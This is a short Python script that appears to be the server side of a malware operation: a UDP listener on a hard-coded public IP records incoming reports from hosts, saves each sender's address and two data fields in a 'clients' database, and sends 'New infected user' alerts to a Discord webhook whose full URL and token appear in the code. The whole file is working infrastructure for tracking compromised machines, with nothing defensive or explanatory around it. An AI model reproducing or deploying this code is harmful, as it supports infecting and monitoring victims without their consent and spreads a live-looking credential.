import socket
import sqlite3
from discord_webhook import DiscordWebhook

ServerSideSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ServerSideSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

try:
    ServerSideSocket.bind(("139.59.147.33", 25))
except socket.error as e:
    print(str(e))


print('Server is ON')


while True:
    try:
        data, addr = ServerSideSocket.recvfrom(2048)
        print(addr)
    except KeyboardInterrupt:
        exit()
    try:
        data = data.decode()
        if "|" in data:
            print(data)
            connexion = sqlite3.connect('database.db')
            c = connexion.cursor()
            data = (str(addr[0]), data.split('|')[0], data.split('|')[1])
            c.execute('''INSERT INTO clients VALUES (Null,?,?,?)''', data)
            connexion.commit()
            connexion.close()
            webhook = DiscordWebhook(
                url='https://discordapp.com/api/webhooks/901109448477642863/WUgz5CXsyDrmEKwr2ODUtseQZeSXwEH_6OiDphbaULA8xjygMh6zI53To3acwM7leJuS',
                content=f"New infected user: {data}").execute()
    except:
        pass
